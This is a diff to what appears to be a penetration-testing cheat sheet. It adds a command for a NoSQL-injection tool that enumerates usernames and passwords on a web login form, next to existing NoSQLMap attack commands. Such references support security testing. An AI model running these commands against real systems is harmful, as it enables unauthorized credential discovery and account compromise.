@@ -418,6 +418,13 @@ python -m SimpleHTTPServer 80
 python nosqlmap.py --attack 2 --victim host.name --webPort 80 --uri / --httpMethod POST --postData username,test_user,password,test_password,login,login --injectedParameter 3 --injectSize 4 --injectFormat 2 --savePath output.log --verb ON
 ```
 
+### NoSQl user/pass enum
+
+```text
+# Git repository: https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
+python3 nosqli_enumeration.py -u http://localhost/index.php -up email -pp password -ep password -m POST
+```
+
 ### Searchsploit
 
 Search exploit
